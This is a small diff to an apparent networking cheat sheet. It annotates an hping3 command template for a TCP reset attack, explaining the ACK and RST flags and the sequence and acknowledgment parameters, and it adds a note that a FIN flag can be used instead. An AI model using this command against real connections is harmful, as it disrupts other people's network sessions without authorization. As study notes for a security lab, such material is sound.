@@ -366,5 +366,6 @@ systemctl start systemd-resolved.service # the service has to be open
 
 # for tcp reset attack
 ```bash
-hping3 [des ip] -s [src port] -p [des port] -A -R -M [seq num "not realtive"] -L [ack num "not relative"] -c [num of reset flags you want to sent "usualy 1"]
+hping3 [des ip] -s [src port] -p [des port] -A "to send ack " -R "to send reset flag" -M [seq num "not relative"] -L [ack num "not relative"] -c [num of reset flags you want to sent "usualy 1"]
+# you may use also -F to send finish tcp flag instead of reset flag
 ```
